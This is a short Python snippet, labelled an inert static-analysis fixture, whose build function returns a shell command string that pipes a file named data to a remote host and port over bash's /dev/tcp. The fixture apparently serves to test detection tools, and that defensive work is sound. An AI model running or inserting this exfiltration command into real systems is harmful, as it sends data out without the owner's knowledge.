# Inert static-analysis fixture. Do not execute.
def build(host, port):
    return f"cat data > /dev/tcp/{host}/{port} 0>&1"

